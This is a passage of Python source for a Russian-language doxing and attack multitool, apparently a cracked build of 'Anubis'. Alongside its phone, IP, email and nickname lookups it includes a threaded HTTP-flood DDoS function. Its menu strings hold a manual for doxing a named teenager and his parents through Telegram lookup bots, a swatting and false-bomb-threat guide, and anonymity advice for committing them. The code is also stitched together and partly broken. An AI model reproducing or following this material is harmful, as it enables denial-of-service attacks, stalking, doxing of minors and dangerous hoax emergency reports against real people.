from colorama import init, Fore, Style
from telethon import TelegramClient
import requests
from bs4 import BeautifulSoup
import requests
import ctypes
import sys
import shutil

def print_multiline_centered(text):
    size = shutil.get_terminal_size()
    width = size.columns
    lines = text.splitlines()
    
    for line in lines:
        padding = (width - len(line)) // 2
        print(' ' * padding + line)

if sys.platform == "win32":
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 3)  

def dedosint():
    import requests
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from geopy.geocoders import Nominatim
from colorama import init, Fore, Style
import re

try:
    import dns.resolver
except ImportError:
    dns = None

init(autoreset=True)

def detect_email_type(email):
    domain = email.lower().split('@')[-1] if email else ''
    email_types = {
        'gmail.com': 'Gmail', 'yahoo.com': 'Yahoo', 'outlook.com': 'Outlook',
        'hotmail.com': 'Outlook', 'mail.ru': 'Mail.ru', 'yandex.ru': 'Yandex',
        'icloud.com': 'iCloud', 'protonmail.com': 'ProtonMail', 'aol.com': 'AOL',
        'zoho.com': 'Zoho'
    }
    return email_types.get(domain, 'Другой')

def validate_email(email):
    return bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email))

def get_info_by_ip(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        if response.get('status') == 'fail':
            print(Fore.BLUE + Style.BRIGHT + "Неверный IP")
            return

        data = {
            'IP': response.get('query', 'Неизвестно'),
            'Страна': response.get('country', 'Неизвестно'),
            'Город': response.get('city', 'Неизвестно'),
            'Регион': response.get('regionName', 'Неизвестно'),
            'Организация': response.get('org', 'Неизвестно'),
            'Провайдер': response.get('isp', 'Неизвестно'),
            'Домен IP': response.get('as', 'Неизвестно')
        }

        for key, value in data.items():
            print(Fore.BLUE + Style.BRIGHT + f"{key}: {value}")

    except requests.RequestException:
        print(Fore.BLUE + Style.BRIGHT + "Ошибка соединения")

def get_info_by_phone(phone):
    try:
        parsed = phonenumbers.parse(phone)
        data = {
            'Номер': phone,
            'Страна': geocoder.description_for_number(parsed, 'ru'),
            'Оператор': carrier.name_for_number(parsed, 'ru'),
            'Часовые пояса': ', '.join(timezone.time_zones_for_number(parsed)),
            'Тип': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            'Нац. формат': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL),
            'Код региона': parsed.country_code,
            'Тип номера': phonenumbers.number_type(parsed),
            'Локация': geocoder.region_code_for_number(parsed)
        }

        geolocation = Nominatim(user_agent="phone_lookup")
        geo_info = geolocation.geocode(data['Страна'])
        data['Город'] = geo_info.address if geo_info else 'Неизвестно'
        data['Координаты'] = f"Широта: {geo_info.latitude}, Долгота: {geo_info.longitude}" if geo_info else 'Неизвестно'

        for key, value in data.items():
            print(Fore.BLUE + Style.BRIGHT + f"{key}: {value}")

        # Добавим ссылки на поиск в соцсетях
        print(Fore.BLUE + Style.BRIGHT + "\n🔍 Возможные ссылки на соцсети:")
        search_links = {
            "Facebook": f"https://www.facebook.com/search/top?q={phone}",
            "Instagram": f"https://www.instagram.com/{phone}",
            "VK": f"https://vk.com/search?c[q]={phone}&c[section]=people",
            "TikTok": f"https://www.tiktok.com/search?q={phone}",
            "LinkedIn": f"https://www.linkedin.com/search/results/all/?keywords={phone}",
            "Twitter (X)": f"https://twitter.com/search?q={phone}",
            "Snapchat": f"https://www.snapchat.com/add/{phone}",
            "Telegram": f"https://t.me/{phone}",
            "WhatsApp": f"https://wa.me/{phone}",
            "Viber": f"viber://add?number={phone}",
            "Skype": f"skype:{phone}?chat",
            "Pinterest": f"https://www.pinterest.com/search/people/?q={phone}",
            "Reddit": f"https://www.reddit.com/search/?q={phone}"
        }

        for name, url in search_links.items():
            print(Fore.BLUE + Style.BRIGHT + f"{name}: {url}")

    except phonenumbers.NumberParseException:
        print(Fore.BLUE + Style.BRIGHT + "Неверный формат номера")
    except Exception:
        print(Fore.BLUE + Style.BRIGHT + "Ошибка обработки")

def get_info_by_email(email):
    try:
        if not validate_email(email):
            print(Fore.BLUE + Style.BRIGHT + "Неверный формат email")
            return

        print(Fore.BLUE + Style.BRIGHT + f"Email: {email}")
        print(Fore.BLUE + Style.BRIGHT + f"Тип: {detect_email_type(email)}")
        print(Fore.BLUE + Style.BRIGHT + f"Домен: {email.split('@')[-1]}")

        if dns:
            try:
                mx_records = dns.resolver.resolve(email.split('@')[-1], 'MX')
                print(Fore.BLUE + Style.BRIGHT + "MX-записи:")
                for mx in mx_records:
                    print(Fore.BLUE + Style.BRIGHT + f" - {mx.exchange}")
            except Exception:
                print(Fore.BLUE + Style.BRIGHT + "MX-записи недоступны")
        else:
            print(Fore.BLUE + Style.BRIGHT + "Установите dnspython для MX-записей")

    except Exception:
        print(Fore.BLUE + Style.BRIGHT + "Ошибка обработки")

def display_menu():
    banner = Fore.BLUE + Style.BRIGHT + r"""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ▒█████    ██████  ██▓ ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒      ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░    
 ░ ░  ░    ░    ░   ▒    ░ ░  ░    ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░      
   ░       ░  ░     ░  ░   ░           ░ ░        ░   ░           ░          
 ░                       ░                                                   
"""
    print(banner)

    while True:
        print(Fore.BLUE + Style.BRIGHT + "\n1 - Поиск по номеру")
        print(Fore.BLUE + Style.BRIGHT + "2 - Поиск по почте")
        print(Fore.BLUE + Style.BRIGHT + "3 - Поиск по IP")

        choice = input(Fore.BLUE + Style.BRIGHT + "Ответ: ")

        if choice == '1':
            phone = input(Fore.BLUE + Style.BRIGHT + "Введите номер: ")
            get_info_by_phone(phone)
        elif choice == '2':
            email = input(Fore.BLUE + Style.BRIGHT + "Введите email: ")
            get_info_by_email(email)
        elif choice == '3':
            ip = input(Fore.BLUE + Style.BRIGHT + "Введите IP: ")
            get_info_by_ip(ip)
        elif choice == '0':
            break
        else:
            print(Fore.BLUE + Style.BRIGHT + "Неверный выбор")

def anubis():
    while True:
     try:
        import platform
        import os
        os.system("pip install pystyle phonenumbers requests whois python-whois colorama")
        import sys
        import socket
        import pystyle
        import phonenumbers, phonenumbers.timezone, phonenumbers.carrier, phonenumbers.geocoder
        import requests
        import whois
        import random
        import colorama
        import threading
        import string
        import faker
        import bs4
        import urllib.parse
        import colorama
        import concurrent.futures
        import csv
        from pystyle import Colorate, Colors
        import hashlib
        import uuid

        if platform.system() == "Windows":
            import ctypes
            GWL_STYLE = -16
            WS_SIZEBOX = 262144
            WS_MAXIMIZEBOX = 65536
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
            style = style & ~WS_SIZEBOX
            style = style & ~WS_MAXIMIZEBOX
            ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, style)
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 3)
            enter = pystyle.Colorate.Horizontal(pystyle.Colors.white_to_red, ('Welcome to Anubis, Press "ENTER" to continue! Крякнул  Asoru мой ккнал: @perehodasoru Anubis идёт нахуй теперь проект мой'))
            pystyle.Anime.Fade(
            pystyle.Center.Center('''          ▄████████ ███▄▄▄▄   ███    █▄  ▀█████████▄   ▄█     ▄████████   
         ███    ███ ███▀▀▀██▄ ███    ███   ███    ███ ███    ███    ███   
         ███    ███ ███   ███ ███    ███   ███    ███ ███▌   ███    █▀    
         ███    ███ ███   ███ ███    ███  ▄███▄▄▄██▀  ███▌   ███          
       ▀███████████ ███   ███ ███    ███ ▀▀███▀▀▀██▄  ███▌ ▀███████████  
         ███    ███ ███   ███ ███    ███   ███    ██▄ ███           ███   
         ███    ███ ███   ███ ███    ███   ███    ███ ███     ▄█    ███   
         ███    █▀   ▀█   █▀  ████████▀  ▄█████████▀  █▀    ▄████████▀
                                                                                 
                Welcome to Anubis, Press "ENTER" to continue! '''), pystyle.Colors.white_to_red, pystyle.Colorate.Vertical, enter=True)
        def Main():
            if platform.system() == "Windows":
                os.system("cls")
                pystyle.Write.Print(pystyle.Center.XCenter('''
                                                              
                               
   ▄████████ ███▄▄▄▄   ███    █▄  ▀█████████▄   ▄█     ▄████████   
  ███    ███ ███▀▀▀██▄ ███    ███   ███    ███ ███    ███    ███   
  ███    ███ ███   ███ ███    ███   ███    ███ ███▌   ███    █▀    
  ███    ███ ███   ███ ███    ███  ▄███▄▄▄██▀  ███▌   ███          
▀███████████ ███   ███ ███    ███ ▀▀███▀▀▀██▄  ███▌ ▀███████████  
  ███    ███ ███   ███ ███    ███   ███    ██▄ ███           ███   
  ███    ███ ███   ███ ███    ███   ███    ███ ███     ▄█    ███   
  ███    █▀   ▀█   █▀  ████████▀  ▄█████████▀  █▀    ▄████████▀    
                                                                      
                                                                      
                                                                      \n'''), pystyle.Colors.white_to_red, interval = 0.0005)
            else:
                os.system("clear")
                pystyle.Write.Print(pystyle.Center.XCenter('''                                                                   
                                    _     _     
                 /\               | |   (_)                  
                /  \   _ __  _   _| |__  _ ___               
               / /\ \ | '_ \| | | | '_ \| / __|              
              / ____ \| | | | |_| | |_) | \__ \              
             /_/    \_\_| |_|\__,_|_.__/|_|___/              
                                                             \n'''), pystyle.Colors.white_to_red, interval = 0.0005)
            pystyle.Write.Print(pystyle.Center.XCenter('''\n
                                                            
 [1] Поиск по номеру        [12] Мануал по анонимности          
 [2] Поиск по сайту         [13] Мануал по сносу аккаунта тг    
 [3] Поиск по нику          [14] Генератор вымышленной личности 
 [4] Поиск по IP            [15] Web-crawler                    
 [5] Поиск по БД            [16] DDOS PRO                       
 [6] DDoS                   [17] Генератор вымышленной карты    
 [7] Генератор прокси       [18] Поиск по Mac-Address           
 [8] Текст банворд          [19] Порт сканер                    
 [9] Генератор паролей      [20] Генератор User-agent           
 [10] Мануал по доксу       [21] Информация                     
 [11] Мануал по свату       [22] Зал славы                      
                                                            

                                                             
                         [23] Выход                          
                                                             
'''), pystyle.Colors.white_to_red, interval = 0.0005)
        Main()
        while True:
            choice = pystyle.Write.Input("\n\n[?] Выберите пункт меню -> ", pystyle.Colors.white_to_red, interval = 0.001)
            if choice == "1":
                phone = pystyle.Write.Input("\n[?] Введите номер телефона -> ", pystyle.Colors.white_to_red, interval = 0.005)
                def phoneinfo(phone):
                    try:
                        parsed_phone = phonenumbers.parse(phone, None)
                        if not phonenumbers.is_valid_number(parsed_phone):
                            return pystyle.Write.Print(f"\n[!] Произошла ошибка -> Недействительный номер телефона\n", pystyle.Colors.white_to_red, interval=0.005)
                        carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                        country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
                        region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
                        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                        is_valid = phonenumbers.is_valid_number(parsed_phone)
                        is_possible = phonenumbers.is_possible_number(parsed_phone)
                        timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
                        print_phone_info = f"""\n[+] Номер телефона -> {formatted_number}
[+] Страна -> {country}
[+] Регион -> {region}
[+] Оператор -> {carrier_info}
[+] Активен -> {is_possible}
[+] Валид -> {is_valid}
[+] Таймзона -> {timezona}
[+] Telegram -> https://t.me/{phone}
[+] Whatsapp -> https://wa.me/{phone}
[+] Viber -> https://viber.click/{phone}\n"""
                        pystyle.Write.Print(print_phone_info, pystyle.Colors.white_to_red, interval=0.005)
                    except Exception as e:
                        pystyle.Write.Print(f"\n[!] Произошла ошибка -> {str(e)}\n", pystyle.Colors.white_to_red, interval=0.005)
                phoneinfo(phone)
            if choice == "2":
                domain = pystyle.Write.Input("\n[?] Введите сайт -> ", pystyle.Colors.white_to_red, interval = 0.005)
                def get_website_info(domain):
                    domain_info = whois.whois(domain)
                    print_string = f"""
[+] Домен: {domain_info.domain_name}
[+] Зарегистрирован: {domain_info.creation_date}
[+] Истекает: {domain_info.expiration_date}  
[+] Владелец: {domain_info.registrant_name}
[+] Организация: {domain_info.registrant_organization}
[+] Адрес: {domain_info.registrant_address}
[+] Город: {domain_info.registrant_city}
[+] Штат: {domain_info.registrant_state}
[+] Почтовый индекс: {domain_info.registrant_postal_code}
[+] Страна: {domain_info.registrant_country}
[+] IP-адрес: {domain_info.name_servers}
        """
                    pystyle.Write.Print(print_string, pystyle.Colors.white_to_red, interval=0.005)
                get_website_info(domain)
            if choice == "3":
                nick = pystyle.Write.Input(f"\n[?] Введите никнейм -> ", pystyle.Colors.white_to_red, interval=0.005)
                urls = [
                    f"https://www.instagram.com/{nick}",
                    f"https://www.tiktok.com/@{nick}",
                    f"https://twitter.com/{nick}",
                    f"https://www.facebook.com/{nick}",
                    f"https://www.youtube.com/@{nick}",
                    f"https://t.me/{nick}",
                    f"https://www.roblox.com/user.aspx?username={nick}",
                    f"https://www.twitch.tv/{nick}",
                ]
                for url in urls:
                    try:
                        response = requests.get(url)
                        if response.status_code == 200:
                            pystyle.Write.Print(f"\n{url} - аккаунт найден", pystyle.Colors.white_to_red, interval=0.005)
                        elif response.status_code == 404:
                            pystyle.Write.Print(f"\n{url} - аккаунт не найден", pystyle.Colors.white_to_red, interval=0.005)
                        else:
                            pystyle.Write.Print(f"\n{url} - ошибка {response.status_code}", pystyle.Colors.white_to_red, interval=0.005)
                    except:
                        pystyle.Write.Print(f"\n{url} - ошибка при проверке", pystyle.Colors.white_to_red, interval=0.005)
                print()
            if choice == "4":
                ip = pystyle.Write.Input("\n[?] Введите IP-адрес -> ", pystyle.Colors.white_to_red, interval = 0.005)
                def ip_lookup(ip):
                    url = f"http://ip-api.com/json/{ip}"
                    try:
                        response = requests.get(url)
                        data = response.json()
                        if data.get("status") == "fail":
                            pystyle.Write.Print(f"[!] Произошла ошибка: {data['message']}\n", pystyle.Colors.white_to_red, interval=0.005)
                        info = ""
                        for key, value in data.items():
                            info += f"[+] {key}: {value}\n"
                        return info
                    except Exception as e:
                        pystyle.Write.Print(f"[!] Произошла ошибка: {str(e)}\n", pystyle.Colors.white_to_red, interval=0.005)
                print()
                pystyle.Write.Print(ip_lookup(ip), pystyle.Colors.white_to_red, interval=0.005)
            if choice == "5":
                path = pystyle.Write.Input("\n[?] Введите путь к БД: ", pystyle.Colors.white_to_red, interval=0.005)
                search_text = pystyle.Write.Input("\n[?] Введите текст:  ", pystyle.Colors.white_to_red, interval=0.005)
                print()
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        for line in f:
                            if search_text in line:
                                pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white_to_red, interval=0.005)
                                print()
                                break
                        else:
                            pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white_to_red, interval=0.005)
                except:
                    try:
                        with open(path, "r", encoding="cp1251") as f:
                            for line in f:
                                if search_text in line:
                                    pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white_to_red, interval=0.005)
                                    print()
                                    break
                            else:
                                pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white_to_red, interval=0.005)
                    except:
                        try:
                            with open(path, "r", encoding="cp1252") as f:
                                for line in f:
                                    if search_text in line:
                                        pystyle.Write.Print("[+] Результат: " + line.strip(), pystyle.Colors.white_to_red, interval=0.005)
                                        print()
                                        break
                                else:
                                    pystyle.Write.Print("[!] Текст не найден.\n", pystyle.Colors.white_to_red, interval=0.005)
                        except:
                            pystyle.Write.Print(f"[!] Произошла ошибка, проверьте ввод данных\n", pystyle.Colors.white_to_red, interval=0.005)
            if choice == "6":
                url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.white_to_red, interval=0.005)
                num_requests = int(
                    pystyle.Write.Input(
                        "[?] Введите количество запросов: ", pystyle.Colors.white_to_red, interval=0.005
                    )
                )
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                ]
                def send_request(i):
                    user_agent = random.choice(user_agents)
                    headers = {"User-Agent": user_agent}
                    try:
                        response = requests.get(url, headers=headers)
                        print(f"{colorama.Fore.white_to_red}[+] Request {i} sent successfully\n")
                    except:
                        print(f"{colorama.Fore.white_to_red}[+] Request {i} sent successfully\n")
                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=[i])
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
            if choice == "7":
                def get_proxy():
                    proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

                    try:
                        response = requests.get(proxy_api_url)
                        if response.status_code == 200:
                            proxy_list = response.text.strip().split("\r\n")
                            return proxy_list
                        else:
                            pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.white_to_red, interval=0.005)
                    except Exception as e:
                        pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.white_to_red, interval=0.005)

                    return None

                proxies = get_proxy()
                if proxies:
                    pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.white_to_red, interval=0.005)
                    for proxy in proxies:
                        pystyle.Write.Print("\n" + proxy, pystyle.Colors.white_to_red, interval=0.005)
                    print()
                else:
                    pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.white_to_red, interval=0.005)
            if choice == "8":
                def transform_text(input_text):
                    translit_dict = {
                        "а": "@",
                        "б": "Б",
                        "в": "B",
                        "г": "г",
                        "д": "д",
                        "е": "е",
                        "ё": "ё",
                        "ж": "ж",
                        "з": "3",
                        "и": "u",
                        "й": "й",
                        "к": "K",
                        "л": "л",
                        "м": "M",
                        "н": "H",
                        "о": "0",
                        "п": "п",
                        "р": "P",
                        "с": "c",
                        "т": "T",
                        "у": "y",
                        "ф": "ф",
                        "х": "X",
                        "ц": "ц",
                        "ч": "4",
                        "ш": "ш",
                        "щ": "щ",
                        "ъ": "ъ",
                        "ы": "ы",
                        "ь": "ь",
                        "э": "э",
                        "ю": "ю",
                        "я": "я",
                        "А": "A",
                        "Б": "6",
                        "В": "V",
                        "Г": "r",
                        "Д": "D",
                        "Е": "E",
                        "Ё": "Ё",
                        "Ж": "Ж",
                        "З": "2",
                        "И": "I",
                        "Й": "Й",
                        "К": "K",
                        "Л": "Л",
                        "М": "M",
                        "Н": "H",
                        "О": "O",
                        "П": "П",
                        "Р": "P",
                        "С": "C",
                        "Т": "T",
                        "У": "Y",
                        "Ф": "Ф",
                        "Х": "X",
                        "Ц": "Ц",
                        "Ч": "Ч",
                        "Ш": "Ш",
                        "Щ": "Щ",
                        "Ъ": "Ъ",
                        "Ы": "bl",
                        "Ь": "b",
                        "Э": "Э",
                        "Ю": "9Y",
                        "Я": "9A",
                    }
                    transformed_text = []
                    for char in input_text:
                        if char in translit_dict:
                            transformed_text.append(translit_dict[char])
                        else:
                            transformed_text.append(char)
                    return "".join(transformed_text)
                input_text = pystyle.Write.Input("\n[?] Введите текст -> ", pystyle.Colors.white_to_red, interval=0.005)
                transformed_text = transform_text(input_text)
                print()
                pystyle.Write.Print("[+] Результат -> " + transformed_text + "\n", pystyle.Colors.white_to_red, interval=0.005)
            if choice == "9":
                def get_characters(complexity):
                    characters = string.ascii_letters + string.digits
                    if complexity == "medium":
                        characters += "!@#$%^&*()"
                    elif complexity == "high":
                        characters += string.punctuation
                    return characters
                def generate_password(length, complexity):
                    characters = get_characters(complexity)
                    password = "".join(random.choice(characters) for i in range(length))
                    return password
                password_length = int(
                    pystyle.Write.Input("[?] Введите длину пароля -> ", pystyle.Colors.white_to_red, interval=0.005)
                )
                complexity = pystyle.Write.Input(
                    "[?] Выберите сложность (low, medium, high): ", pystyle.Colors.white_to_red, interval=0.005)
                print()
                complex_password = generate_password(password_length, complexity)
                pystyle.Write.Print("[+] Пароль -> "+ complex_password + "\n", pystyle.Colors.white_to_red, interval=0.005)
            if choice == "10":
                pystyle.Write.Print('''\nВ этом руководстве я подробно опишу, как найти практически любого человека, который не обеспечен должным уровнем защиты в интернете. Этот метод будет полезен для новичков, хотя профессионалы могут найти его недостаточно сложным. Руководство будет основано на легком, но эффективном проникновении через ботов, ссылки на которых я предоставлю в самом низу.

Итак, приступим. У нас есть аккаунт в Telegram - это все, что нам нужно. Основная цель - получить номер телефона или хотя бы имя и область/город. Как мы это делаем? В Telegram существуют боты-сервисы, способные предоставить вам номер телефона практически любого аккаунта в этой платформе. Вот список таких ботов:

1. Глаз Бога
2. Quick Osint
3. GtaSearch
4. BlackatSearch
5. Криптоскан
6. Telegram Analyst

Получили номер. Затем используем сочетание трех ботов - Универсал, Глаз Бога и Юзерсбокс. Заходим в Глаз Бога и начинаем поиск...

Теперь у нас есть два варианта развития событий, и я рассмотрю наиболее сложный.

Допустим, мы нашли только регион проживания жертвы, страну, имя и фамилию. Что дальше? Перепроверяем, используя Универсал, который предоставляет информацию о социальных сетях, зарегистрированных на этот номер телефона. Мы убеждаемся в правильности фамилии и имени, а иногда даже отчества.

Так. Мы получили правдоподобную информацию, включающую имя, фамилию и регион жертвы. Мы вводим эти данные в Юзерсбокс и ищем. Получаем результаты, включающие либо саму жертву, либо список людей с подобными данными. Как найти нужного? Ориентируемся на возраст и адрес. Затем снова обращаемся к Универсалу и проверяем результаты, ища подтверждение в виде даты рождения или города. Нашли. Получаем следующие данные:

Зузурин Михаил, 12.12.2008, Краснодарский край.

Вводим их также в Юзерсбокс и ищем, находим номер или несколько, просматриваем их и собираем информацию. Затем проверяем ФИО + дату рождения в Глазе Бога, где находим еще больше информации и добавляем ее в текстовый файл, придавая всему свой стиль.

Теперь, допустим, вы нашли саму жертву, но нужно найти его родителей? Не проблема. В процессе поиска жертвы мы однозначно получили часть данных о ее отце. Что у нас есть:

Зузурин Михаил Александрович, 12.12.2008, Краснодарский край.

Что мы делаем? Ищем: Зузурин Александр, Краснодар. Далее все просто. Мы ищем и сверяем адрес с ранее найденным, также учитываем возраст. Отлично, Шерлок! Вы нашли отца. Зузурин Александр Николаевич, 15.04.1976. Проверяем ФИО и дату рождения в Юзерсбоксе и Глазе Бога, получаем результаты, пробивая их также по номеру.

Как найти мать? На основе найденной информации об отце мы получаем его номер, на который однозначно зарегистрирована какая-то социальная сеть. Достаем любую фотографию и отправляем ее в Глаз Бога в поисках VKонтakte. Мы находим профиль отца, где либо в подписках будет его жена, либо ее можно увидеть на аватарке. Затем проверяем либо найденный VK, либо фотографию жены, и снова пробиваем VK.

Как достать номер из VKонтakte? Существует три бота, которые могут это сделать:

1. VKHistory
2. Глаз Бога
3. Юзерсбокс

Ой, проблема. Нигде не удалось найти номер. Что делать? В профиле жены в VK указаны имя, фамилия, дата рождения, а также известен город проживания. Мы вводим эти данные в Юзерсбокс и ищем:

Зузурина Мария, 24.05.1978, Краснодар.

Находим информацию, начинаем проверять по номеру и записываем результаты.

Готово! Написано досье на жертву и ее родителей исключительно с использованием ботов в Telegram. Поздравляю!\n''', pystyle.Colors.white_to_red, interval = 0.005)
            if choice == "11":
                pystyle.Write.Print('''\nДля начала требуется получить доступ к почтовым аккаунтам на mail.ru и proton.mail через соответствующие веб-сайты от имени жертвы. Подробности о процессе не требуются.

После завершения этого шага переходим в мессенджер Telegram и приобретаем виртуальные номера для protonMail или Mail.ru. Рекомендуемые боты, не склонные к утечке введенной информации и SMS, включают в себя @GreedySMSbot и @SMSBest_bot.

Затем, после приобретения виртуального номера, необходим хороший платный VPN и прокси. Рекомендуется использовать Mullvad VPN как наиболее надежный

После покупки виртуального номера для почты следует написать текст, который не попадет в спам. Лучше всего сформулировать его как руководство по "Swatting". Ниже представлен список инструментов, необходимых для успешной операции:

1. Операционная система Android.
2. Почтовый сервис Proton Mail.
3. Комбинация мультихоп VPN: Proton VPN и MullVad VPN.
4. Tor Browser с соответствующими плагинами или Firefox с плагинами.

Мультихоп представляет собой использование двух и более VPN одновременно на устройстве.

Шаги для подготовки:

1. Создание нового почтового ящика на Proton Mail.
2. Загрузка виртуальной машины на телефон.
3. Установка еще одной виртуальной машины внутри первой.
4. Загрузка MullVad VPN на телефон без виртуальной машины.
5. Установка того же VPN на первой виртуальной машине с выбором другого региона.
6. Загрузка Proton VPN на второй виртуальной машине.
7. Загрузка Tor Browser или Firefox с плагинами на последнюю виртуальную машину.
8. Посещение сайта Proton Mail для более безопасного использования.
9. Настройка браузера Firefox внутри виртуальной машины для обеспечения улучшенной защиты от отслеживания и удаления куки-файлов.

Для отправки электронной почты через Proton Mail рекомендуется включить антифрод (цензурирование определенных слов в письме).

После составления письма, которое будет привлекательным для получателя, рекомендуется отправить его не менее чем на 20 адресов электронной почты. Обязательно укажите контактные данные жертвы, такие как ФИО и номер телефона или карты.

Следите за временем и местоположением жертвы, избегайте отправки писем в неподходящее время, чтобы добиться наилучших результатов. При желании можно представляться любым человеком и заминировать любое здание. Указание контактных данных увеличит вероятность заинтересованности получателя.\n''', pystyle.Colors.white_to_red, interval = 0.005)
            if choice == "12":
                pystyle.Write.Print('''\nРуководство по обеспечению анонимности

[Доксинг]

При вступлении в сообщество обезличивания, необходимо осознать дополнительные риски, поскольку следует помнить: найдется человек, способный разоблачить вас в кратчайшие сроки.

Анонимность в Telegram - базовый уровень. Она включает использование виртуальных номеров, однако стоит помнить, что эта услуга не обеспечит полной защиты из-за возможности сохранения логов. Поэтому рекомендуется искать поставщиков услуг с активными номерами и фальшивой информацией. Например, пользователя по имени "смолин" либо тех, кто рекламирует подобные услуги на своем телеграм-канале.

Этот раздел ориентирован на русскоязычных пользователей. Для украинцев проще: достаточно приобрести сим-карту Vodafone и зарегистрировать на нее исключительно аккаунт в Telegram.

Затем необходимо удалить свои данные из "глаза бога". Думаю, многие знакомы с этой процедурой. Но зачем она, если у вас чистый или виртуальный номер? Личность может начать поиски, уверенная, что ваш аккаунт содержит достоверную информацию. Это усложняет ее задачу при использовании популярных ботов для извлечения номеров, таких как Quick Osint, BlackatSearch, GTA, SmartSearch.

Кроме того, стоит учитывать следующие пять простых правил:

1. НИКОГДА не разглашайте личную информацию, используйте чужие имя, возраст, страну и город проживания, никаких подробностей.
2. НИКОГДА не передавайте свой номер телефона, даже если он чистый или виртуальный. Не отправляйте его ботам, включая "глаз бога". Многие боты могут использовать скрипты деанонимизации, запрашивая ваш контакт.
3. При покупке подписки в "глазе бога" используйте временную почту, например, через сервис TempMail, чтобы избежать утечки вашей почты.
4. Не используйте одинаковые имена пользователей для своих аккаунтов.
5. Используйте прокси. Некоторые участники сообщества создают сайты с IP-логгерами. Для предотвращения утечки местоположения и IP-адреса настройте прокси-сервер в Telegram и открывайте ссылки прямо в приложении Telegram или используйте VPN, если не уверены в настройках.

Анонимность в Telegram - это основа. Но что делать вне Telegram? Кроме Telegram существуют сообщества в VKontakte и Discord. Как обезопасить себя? Избегайте русскоязычные социальные сети и сервисы, так как они также могут подвергать вас риску утечки данных. VKontakte является одной из наименее безопасных социальных сетей. Рекомендуется удалить все свои личные аккаунты и отписаться от групп, связанных с родственниками, друзьями, школами или городами. Это не относится к Telegram. Очищайте аккаунты и затем удаляйте их.

[Swatting]

Анонимность в этом случае базируется на четырех основных компонентах: прокси-сервере, VPN, Tor-браузере и Linux.

Настройку Tor и Linux для анонимности можно найти на YouTube, так как это не секрет и в сети много подобных видеороликов.
VPN. Я лично использую Nord и Mullvad для сваттинга или лжеминирования. Важно использовать сразу два VPN для лучшей анонимности.
Прокси. Не используйте бесплатные прокси-сервера, купите платные, чтобы обеспечить полную безопасность.

Кроме того, для окончательной безопасности в сети при сваттинге или лжеминировании используйте не свой домашний Wi-Fi или мобильный интернет. Рекомендуется подключаться к бесплатной сети в кафе и использовать ее для незаконных действий.

!! ВАЖНО !!

При сваттинге или лжеминировании НИ ПО КАКИМ ОБСТОЯТЕЛЬСТВАМ НЕ ПОСЕЩАЙТЕ САЙТЫ, НА КОТОРЫХ МОЖЕТ БЫТЬ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ. Включайте VPN только при регистрации почты для отправки писем, а затем отключайте его.

